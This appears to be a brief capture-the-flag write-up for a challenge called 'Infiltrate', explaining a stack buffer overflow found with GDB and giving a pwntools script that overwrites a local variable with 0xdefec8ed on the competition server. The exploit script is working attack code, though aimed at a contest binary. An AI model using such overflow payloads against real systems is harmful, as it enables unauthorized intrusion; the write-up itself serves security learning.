# Infiltrate

Using GDB, take a look at `main()` function. It sets **rbp-0x4** = *0xbaadc0de*, and then compares it to *0xdefec8ed*. The input starts from **rbp-0x30**. Clearly a buffer overflow vulnerability

```python
from pwn import *

p = remote('infiltrate.2024-bq.ctfcompetition.com',1337)
p.recvuntil(b'Username please: ')

offset = 0x30-4
payload = b'a'*offset + p32(0xdefec8ed)
p.sendline(payload)
p.interactive()
```
